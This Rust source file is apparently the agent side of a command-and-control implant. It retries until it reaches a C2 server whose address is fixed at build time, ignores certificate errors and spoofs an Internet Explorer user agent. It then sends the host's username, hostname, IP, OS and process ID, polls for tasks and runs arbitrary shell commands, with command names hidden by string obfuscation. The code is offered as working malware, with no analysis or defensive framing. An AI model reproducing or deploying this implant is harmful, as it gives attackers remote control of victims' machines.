// imports
use std::time::Duration;
use std::thread::sleep;
use serde::{Serialize, Deserialize};

// structs
#[derive(Debug, Serialize, Deserialize)]
pub struct RegisterLink {
    pub link_username:     String,
    pub link_hostname:     String,
    pub internal_ip:        String,
    pub external_ip:        String,
    pub platform:        String,
    pub pid:                u32,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Task {
    pub q:                  String,
    pub tasking:            String,
    pub x_request_id:       String,
}

pub fn link_loop() {
    let ua = user_link();
    let client = reqwest::blocking::Client::builder()
        .user_agent(ua)
        .cookie_store(true)
        .danger_accept_invalid_certs(true)
        //.http2_prior_knowledge()
        .build().unwrap();
    // SECURITY
    // encrypted callback string with env var at build
    let callback = env!("CALLBACK").to_string();
    let step1_cb = format!("https://{}/js", callback);
    let step2_cb = format!("https://{}/static/register", callback);
    let step3_cb = format!("https://{}/static/get", callback);
    // keep retrying to reach C2
    loop {
        let step1 = client.get(step1_cb.as_str()).send();
        match step1 {
            Ok(_) => break,
            Err(_) => continue,
        }
    }
    let register_link = RegisterLink {
            link_username: whoami::username(),
            link_hostname: whoami::hostname(),
            internal_ip: internal_ip(),
            external_ip: String::new(),
            platform: std::env::consts::OS.to_string(),
            pid: pid(),
    };
    let mut uresp: reqwest::blocking::Response;
    loop {  
        let resp = client.post(step2_cb.as_str())
            .json(&register_link)
            .send();
        match resp {
            Ok(_) => {
                uresp = resp.unwrap();
                break
            },
            Err(_) => continue,
        }
    }
    let mut recv_task: Task = uresp.json().unwrap();

    // link loop
    let mut send_task = Task {            
        q:              String::from(""),
        tasking:        String::from(""),
        x_request_id:   String::from(""),
    };
    loop {
        // poll
        let resp = client.post(step3_cb.as_str())
            .header("x-request-id", recv_task.x_request_id.clone())
            .json(&send_task)
            .send();
        match resp {
            Ok(_) => (),
            Err(_) => continue,
        }
        uresp = resp.unwrap();
        recv_task = uresp.json().unwrap();
        send_task.q = String::new();
        send_task.tasking = String::new();

        if recv_task.tasking.len() > 0 {
            // time to exec the command
            send_task.q = link_command(recv_task.q);
            if send_task.q.clone() == "exit".to_string() {
                break;
            }
            send_task.tasking = recv_task.tasking;
            recv_task.q = String::new();
            recv_task.tasking = String::new();
            // no need to wait after a task
            continue;
        }
        // this should be defined by server with jitter and delay
        sleep(Duration::from_secs(3));
    }
}

fn link_command(command: String) -> String {
    // DEBUG AGENT
    let arg_split = command.as_str().split(' ');
    let args = arg_split.collect::<Vec<&str>>();
    // obfsscated args
    match args[0] {
        a if (a == obfstr::obfstr!("shell")) => shell(args),
        a if (a == obfstr::obfstr!("cd")) => cd(args),
        a if (a == obfstr::obfstr!("pwd")) => pwd(),
        a if (a == obfstr::obfstr!("ls")) => ls(args),
        a if (a == obfstr::obfstr!("pid")) => pid().to_string(),
        a if (a == obfstr::obfstr!("whoami")) => String::from(format!("{}@{}", whoami::username(), whoami::hostname())),
        a if (a == obfstr::obfstr!("exit")) => return "exit".to_string(),
        _ => String::from(format!("not a command")),
    }
}

fn shell(args: Vec<&str>) -> String {
    if args.len() < 1 {
        return String::from("")
    }
    let output = std::process::Command::new(args[1])
        .args(&args[2..])
        .output();
    match output {
        Ok(output) => { return String::from(format!("{}{}", 
            String::from_utf8(output.stdout).unwrap(), 
            String::from_utf8(output.stderr).unwrap()))
        },
        Err(e) => return format!("{}", e),
    }
}

fn ls(args: Vec<&str>) -> String {
    let mut directory = ".";
    if args.len() > 1 {
        directory = args[1];
    } 
    let read = std::fs::read_dir(directory);
    let mut output: Vec<String> = Vec::new();
    if read.is_ok() {
        for path in read.unwrap() {
            if let Ok(entry) = path {
                // get more metadata and format correctly
                // file and folder perms
                if let Ok(metadata) = entry.metadata() {
                    output.push(String::from(format!("{:100}    {}", entry.path().display(), metadata.len())));
                } else {
                    output.push(String::from(format!("{}", entry.path().display())));
                }
            }
        }
    } else {
        return String::from(format!("Could not ls: {:?}", read.err().unwrap()))
    }
    output.join("\n")
}

fn pwd() -> String {
    if let Ok(current) = std::env::current_dir() {
        return String::from(format!("{}", current.display()))
    } else {
        return String::from("Could not get current directory")
    }
}

fn cd(args: Vec<&str>) -> String {
    if args.len() > 1 {
        if std::env::set_current_dir(args[1]).is_ok() {
            return String::from(args[1])
        } else {
            return String::from("Could not change directory")
        }
    } else {
        return String::from("")
    }
}

fn internal_ip() -> String {
    // thanks https://github.com/egmkang/local_ipaddress/
    let non_routable = "127.0.0.1".to_string();
    use std::net::UdpSocket;
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(_) => return non_routable,
    };
    match socket.connect("8.8.8.8:80") {
        Ok(()) => (),
        Err(_) => return non_routable,
    };
    match socket.local_addr() {
        Ok(addr) => return addr.ip().to_string(),
        Err(_) => return non_routable,
    };
}

fn pid() -> u32 {
    std::process::id()
}

// TODO
// dynamic with build env var
fn user_link() -> String {
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko".to_string()
}
